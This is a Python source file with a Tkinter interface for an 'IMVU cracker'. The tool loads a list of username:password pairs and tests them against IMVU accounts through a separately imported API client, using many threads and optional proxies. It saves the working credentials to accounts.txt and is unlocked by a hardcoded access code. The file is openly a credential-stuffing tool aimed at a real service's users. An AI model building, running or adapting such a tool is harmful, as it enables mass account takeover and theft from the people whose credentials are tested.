import tkinter as tk
from tkinter import ttk, PhotoImage
from tkinter import filedialog as fd
from threading import Thread
import time
from con.imvu_api import imvu_api_client


class ImvuCracker(tk.Tk):
    font_family = 'Inter'
    app_windows_x = 455
    app_window_y = 711
    proxy = False
    list_accounts_file = None
    running = False
    curret_counter = 0
    status_login = False

    def __init__(self, bots):
        super().__init__()
        self.title('WORDLIST ZABBIX IMVU CRACKER')
        self._bots = bots

        self.geometry(f'{self.app_windows_x}x{self.app_window_y}')
        self.minsize(self.app_windows_x, self.app_window_y)
        self.maxsize(self.app_windows_x, self.app_window_y)

        self.configure(background='#474343')

        self.pinguin = ttk.Label(self, text='MAIN MENU')
        self.pinguin.pack()
        self.pinguin.config(font=(self.font_family, 15),
                            background='#474343', foreground='white')
        self.pinguin.pack(pady=5)

        # label
        self.menu_title = ttk.Label(
            self, text='WORDLIST ZABBIX IMVU CRACKER')
        self.menu_title.pack()
        self.menu_title.config(font=(self.font_family, 10),
                               background='#474343', foreground='white')
        self.menu_title.place(relx=0.5, rely=0.98, anchor='center')

        button_list = PhotoImage(file=r'./src/add_list_button.png')
        self.add_world_list = ttk.Button(self, image=button_list)
        self.add_world_list.image = button_list
        self.add_world_list['command'] = self._add_world_list
        self.add_world_list.pack(pady=10)

        button_proxy = PhotoImage(file='src/active_proxy_button.png')
        self.active_proxy = ttk.Button(self, image=button_proxy)
        self.active_proxy.image = button_proxy
        self.active_proxy['command'] = self._set_proxy
        self.active_proxy.pack(pady=10)

        button_run = PhotoImage(file='src/run.png')
        self.run = ttk.Button(self, image=button_run)
        self.run.image = button_run
        self.run['command'] = self.thread
        self.run.pack(pady=10)

        self.logs = tk.Text(self, height=23, width=50,
                            background='#323232', foreground="white")
        self.logs.pack(pady=20)

    def _add_finded_accounts(self, text):
        self.logs.insert(tk.END, f'{text}\n')

    def _add_world_list(self):
        filetypes = (
            ('text files', '*.txt'),
            ('All files', '*.*')
        )

        filename = fd.askopenfilename(
            title='Open a file',
            initialdir='/',
            filetypes=filetypes)

        self.list_accounts_file = open(filename, 'r').read()
        self._add_finded_accounts('<FILE>: loadded')

    def _set_proxy(self):
        if self.proxy:
            self._add_finded_accounts('<PROXY>: off')
            self.proxy = False
        else:
            self._add_finded_accounts('<PROXY>: on')
            self.proxy = True

    def _run(self, n, t):
        for i in n:
            if len(i) > 1:
                a = imvu_api_client(
                    i.split(':')[0], i.split(':')[1], t, self.proxy)
                self.curret_counter += 1
                if str(self.curret_counter)[len(str(self.curret_counter))-3:] == '000':
                    self._add_finded_accounts(
                        f'<ZABBIX>: Accounts scaned {self.curret_counter}')

                if a != None:
                    f = open(f'accounts.txt', 'a')
                    f.write(f'{a}\n')
                    f.close()

    def thread(self):
        open(f'accounts.txt', 'w')
        if self.list_accounts_file != None:
            self.running = True
            self.list_accounts_file = self.list_accounts_file.split('\n')
            self.chunked_list = list()
            chunk_size = int(len(self.list_accounts_file) / int(self._bots))

            for i in range(0, len(self.list_accounts_file), chunk_size):
                self.chunked_list.append(
                    self.list_accounts_file[i:i+chunk_size])

            thread_list = []
            c = 0
            for i in self.chunked_list:
                c += 1
                th = Thread(target=self._run, args=(i, c,))
                thread_list.append(th)

            for th in thread_list:
                time.sleep(0.05)
                th.start()

            self._add_finded_accounts(
                f'<THREADS>: charged {len(self.chunked_list)-1}')

        else:
            self._add_finded_accounts('<ZABBIX>: Please add list to run')


class Login(tk.Tk):
    def __init__(self):
        super().__init__()
        self.login()

    def login(self):
        self.title('WORDLIST ZABBIX IMVU CRACKER')
        # Create a Toplevel window
        self.geometry(
            f'{ImvuCracker.app_windows_x}x{ImvuCracker.app_window_y}')
        self.minsize(ImvuCracker.app_windows_x, ImvuCracker.app_window_y)
        self.maxsize(ImvuCracker.app_windows_x, ImvuCracker.app_window_y)
        self.configure(background='#474343')

        self.welcome = ttk.Label(self, text="Zabbix Imvu Tools",
                                 font=(ImvuCracker.font_family, 20), background='#474343', foreground='white')
        self.welcome.pack(pady=20)

        self.user_l = ttk.Label(self, text="Access Code",
                                font=(ImvuCracker.font_family, 13), background='#474343', foreground='white')
        self.user_l.pack(pady=3)
        self.access = ttk.Entry(self, width=40)
        self.access.focus_set()
        self.access.pack(pady=5)

        self.thereads_l = ttk.Label(self, text="Threads (int value)",
                                    font=(ImvuCracker.font_family, 13), background='#474343', foreground='white')
        self.thereads_l.pack(pady=3)
        self.theread = ttk.Entry(self, width=40)
        self.theread.focus_set()
        self.theread.pack(pady=5)

        self.loggin_botton = ttk.Button(self, text="Login", width=20,
                                        command=self.check_login).pack(pady=30)

    def check_login(self):
        access = self.access.get()
        theread = self.theread.get()

        try:
            int(theread)
            if access == 'iv^tbEGgk^O0vPJmCJcCYj':
                self.destroy()
                app = ImvuCracker(theread)
                app.mainloop()
        except:
            pass


if __name__ == "__main__":
    app = Login()
    app.mainloop()
